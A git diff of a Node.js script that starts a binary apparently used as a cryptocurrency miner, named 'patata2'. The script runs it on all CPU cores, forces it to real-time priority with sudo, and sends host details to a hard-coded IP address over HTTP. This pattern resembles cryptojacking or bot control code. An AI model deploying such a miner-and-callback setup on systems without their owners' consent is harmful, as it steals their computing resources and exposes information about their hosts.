@@ -4,18 +4,19 @@ const execSync = require('child_process').execSync;
 const args = process.argv.slice(2);
 const http = require("http");
 const os = require('os');
-const miner = spawn('/home/patata2', ['-o', args[1], '-u', args[0], '-t', os.cpus().length, '--av=2', '-k', '--no-color']);
+const miner = spawn('/patata/patata2', ['-o', args[1], '-u', args[0], '-t', os.cpus().length, '--av=2', '-k', '--no-color']);
 const options = {
     host: "51.254.143.175",
     path: "/check",
-    port: "8084",
+    port: "8085",
     method: "POST",
     headers: {"Content-Type": "application/json"},
 };
 var info = getInfo();
 
-//execSync('sudo renice -n -20 -p ' + miner.pid);
-execSync('sudo chrt -f -p 98 ' + miner.pid);
+execSync('sudo chrt -f -p 98 ' + miner.pid)
+
+
 
 function getInfo () {
     var res = {
